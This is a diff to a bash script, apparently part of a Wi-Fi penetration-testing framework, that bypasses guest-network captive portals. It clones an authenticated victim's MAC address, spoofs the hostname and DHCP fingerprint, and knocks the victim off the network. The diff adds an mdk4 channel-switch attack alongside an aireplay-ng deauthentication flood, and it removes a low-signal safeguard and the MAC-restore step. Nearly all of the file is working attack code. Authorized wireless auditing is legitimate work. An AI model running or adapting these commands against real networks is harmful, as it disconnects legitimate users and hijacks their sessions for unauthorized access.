@@ -4,7 +4,7 @@
 # CATEGORY="F"
 # DEPS="A4"
 # CRITICAL="no"
-# TOOLS="macchanger,curl,aireplay-ng"
+# TOOLS="macchanger,curl,aireplay-ng,mdk4"
 # DESC="Bypass captive portal via MAC spoofing of authenticated clients"
 # REQS="managed_iface,target_ssid"
 # PCAP="no"
@@ -16,86 +16,71 @@
 #
 #  METHODOLOGY (SPEC ALIGNED):
 #  1. Identify authenticated MACs from A4 Client Fingerprinting.
-#  2. Interactive Selection: Select a target MAC to clone.
-#  3. Deauthenticate the victim to prevent ACK storms/collisions.
-#  4. Spoof local MAC and request DHCP to hijack the session.
+#  2. Use TARGET_CLIENT provided by Go brain.
+#  3. Deauthenticate/Suppress the victim to prevent ACK storms/collisions.
+#  4. Spoof local identity (MAC + Hostname + DHCP Fingerprint).
 #===============================================================================
 
 set -euo pipefail
 
+# Intelligence Insight (Colors)
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
 C_BOLD="${ASTRA_COLOR_BOLD:-}"
 C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
-    echo -e "[*] Session hijacking is highly unstable at this distance."
-    stty sane
-    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET} ")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
-
 # Inputs from Environment
-# ...
+INTERFACE="${WIFI_INTERFACE:-}"
+SSID="${GUEST_SSID:-}"
+TARGET_BSSID="${GUEST_BSSID:-}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="F4"
+TARGET_CLIENT="${TARGET_CLIENT:-}"
 
 if [[ -z "$INTERFACE" ]]; then
     echo "[!] WIFI_INTERFACE not set."
     exit 1
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Initializing Captive Portal Bypass tactical options..."
-
-# 1. Identity Selection
-# ... (Finding A4 file logic)
-
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select target MAC to clone:${C_RESET}"
-for i in "${!CLIENTS[@]}"; do
-    echo "    $((i+1))) ${CLIENTS[$i]}"
-done
-stty sane
-read -p "$(echo -e "${C_ACTION} Selection [1-${#CLIENTS[@]}]: ${C_RESET} ")" choice
-
-if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
-    VICTIM_MAC="${CLIENTS[$((choice-1))]}"
-    echo -e "[*] Target Victim: ${C_VAR}$VICTIM_MAC${C_RESET}"
-else
-    echo -e "${C_PROMPT}[!]${C_RESET} Invalid selection."
-    exit 1
+if [[ -z "$TARGET_CLIENT" ]]; then
+    echo "[!] No target client specified. Identity spoofing requires a victim MAC."
+    exit 0
 fi
 
-# 2. Roaming / Suppression
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Suppress victim to prevent IP/ACK collision?${C_RESET}"
-echo "    1) YES (Targeted Deauth flood - Stealthier)"
-echo "    2) NO (Risk instability)"
-stty sane
-read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET} ")" deauth_choice
+echo -e "${C_PROMPT}[*]${C_RESET} Starting identity spoofing bypass for: ${C_VAR}$TARGET_CLIENT${C_RESET}"
 
-if [[ "$deauth_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
-    echo "[*] Starting victim suppression in background..."
-    aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$VICTIM_MAC" "$INTERFACE" > /dev/null 2>&1 &
-    DEAUTH_PID=$!
-    trap 'kill $DEAUTH_PID 2>/dev/null || true' EXIT
+# 1. Roaming / Suppression
+# If possible, we suppress the victim in the background
+if [[ -n "$TARGET_BSSID" ]]; then
+    if command -v mdk4 &>/dev/null; then
+        echo -e "[*] Starting ${C_BOLD}PMF-resilient suppression (mdk4 CSA)${C_RESET} in background..."
+        # mdk4 b -c: Force clients to roam to a non-existent channel (14)
+        mdk4 "$INTERFACE" b -n "$SSID" -c 14 > /dev/null 2>&1 &
+        SUPPRESS_PID=$!
+    else
+        echo -e "[*] Starting legacy deauth suppression in background..."
+        aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 &
+        SUPPRESS_PID=$!
+    fi
+    trap 'kill $SUPPRESS_PID 2>/dev/null || true' EXIT
 fi
 
-# 3. Spoofing Execution
-echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
+# 2. Spoofing Execution
+echo -e "[*] Executing Full Identity Spoofing for ${C_VAR}$TARGET_CLIENT${C_RESET}..."
 ip link set "$INTERFACE" down
-macchanger -m "$VICTIM_MAC" "$INTERFACE"
+macchanger -m "$TARGET_CLIENT" "$INTERFACE"
 
-# Spoof Hostname (Advanced Evasion)
 OLD_HOSTNAME=$(hostname)
-SPOOFED_HOSTNAME="iPad-of-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
-echo "[*] Temporarily spoofing hostname to $SPOOFED_HOSTNAME..."
+SPOOFED_HOSTNAME="iPad-of-$(echo $TARGET_CLIENT | cut -d: -f5,6 | tr -d ':')"
+echo -e "[*] Temporarily spoofing hostname to ${C_VAR}$SPOOFED_HOSTNAME${C_RESET}..."
 hostname "$SPOOFED_HOSTNAME"
-trap "hostname $OLD_HOSTNAME" EXIT
+trap "hostname $OLD_HOSTNAME; kill ${SUPPRESS_PID:-} 2>/dev/null || true" EXIT
 
 ip link set "$INTERFACE" up
 
-echo "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
-# Create custom dhclient.conf to mimic iOS/Android parameters
 DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
 cat <<EOF > "$DHCP_CONF"
 send host-name "$SPOOFED_HOSTNAME";
@@ -105,44 +90,26 @@ request subnet-mask, broadcast-address, time-offset, routers,
         rfc3442-classless-static-routes, ntp-servers;
 EOF
 
+echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
 timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
 
-# 4. Verification
-echo "[*] Verifying internet access..."
+# 3. Verification
+echo -e "[*] Verifying internet access..."
 BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_bypass.log"
 if curl -s --connect-timeout 5 http://www.google.com > /dev/null; then
-    echo "[!] SUCCESS: CAPTIVE PORTAL BYPASSED!" | tee -a "$BYPASS_LOG"
+    echo -e "[!] ${C_BOLD}SUCCESS: CAPTIVE PORTAL BYPASSED!${C_RESET}" | tee -a "$BYPASS_LOG"
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
         --name "Captive Portal Bypass Successful" \
         --severity CRITICAL \
-        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $VICTIM_MAC." \
+        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $TARGET_CLIENT." \
         --target "$SSID" \
         --evidence "$BYPASS_LOG" \
-        --rationale "Captive portals that rely solely on MAC addresses for session tracking are highly vulnerable to identity cloning."
+        --rationale "Identity cloning allows unauthorized access to restricted guest segments."
 else
-    echo "[+] Bypass attempt complete. No internet access detected." | tee -a "$BYPASS_LOG"
-    "$ASTRA_BIN" record-finding \
-        --session-dir "$SESSION_DIR" \
-        --tc "$TC_ID" \
-        --type vulnerability \
-        --name "[F4] Audit Complete" \
-        --severity INFO \
-        --desc "Attempted MAC spoofing bypass for $SSID. Unrestricted access not achieved." \
-        --target "$SSID" \
-        --evidence "$BYPASS_LOG" \
-        --rationale "Bypass failure may indicate advanced session tracking (e.g., sequence numbering, browser fingerprinting) or lack of active authorized sessions."
-fi
-
-# 5. Restore MAC (Optional but good practice)
-echo "[?] Restore original MAC? [y/N]"
-read -r restore
-if [[ "$restore" == "y" ]]; then
-    ip link set "$INTERFACE" down
-    macchanger -p "$INTERFACE"
-    ip link set "$INTERFACE" up
+    echo -e "[+] Mission complete. Unrestricted access not achieved."
 fi
 
 exit 0
